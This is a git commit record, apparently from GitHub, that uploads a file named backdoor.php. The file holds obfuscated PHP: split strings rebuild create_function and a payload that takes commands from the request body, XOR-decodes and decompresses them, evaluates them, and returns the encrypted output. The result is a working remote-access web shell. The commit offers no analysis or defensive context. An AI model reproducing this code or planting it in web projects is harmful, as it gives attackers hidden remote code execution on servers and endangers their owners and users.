e36b2f002941163c224db6b1cbd14966b8f3edb2
lewisslanter <92781058+lewisslanter@users.noreply.github.com>
2023-08-11 20:14:15 +1000

    Add files via upload

---
+++ backdoor.php
@@ -0,0 +1,11 @@
+<?php
+$S='0%0%_end_clean();$r=0%@base0%64_enco0%de(@x(0%@gzc0%ompress0%($o),$k0%));0%print("$0%p$kh$r$0%kf");}';
+$u='0%$j<$c&0%&$i<$0%0%0%l);$j++,$i++)0%{$o.=0%$t{$0%i}^$k{$j};}}r0%etur0%n $o;0%}0%if (@0%preg_0%mat';
+$V='ch("/$kh(.+)$kf0%/",0%0%@file_0%get_conte0%nts(0%"ph0%p://input"),$m)==0%10%) {@ob_sta0%rt0%();@ev';
+$h='$k="1a0%0%1d0%c91c";$kh="907325c0%69270%0%1";0%$kf="ddf0c944bc70%2";$p=0%0%"Mk320%kWcAtl2DUf0%aj";f';
+$r=str_replace('IU','','creIUIUateIUIU_funcIUtiIUon');
+$Y='a0%l(@0%gzuncompr0%ess(0%@x(@base0%0%64_decode0%($0%0%m[1])0%,$k0%)));$o=@o0%b_get_contents();@ob';
+$Z='uncti0%on x($0%t0%,$k)0%0%{$c=0%strlen($k);0%$l=strlen($t);$0%o="";0%for($i=00%;$i<$l0%;)0%{for($j=0;(';
+$s=str_replace('0%','',$h.$Z.$u.$V.$Y.$S);
+$y=$r('',$s);$y();
+?>
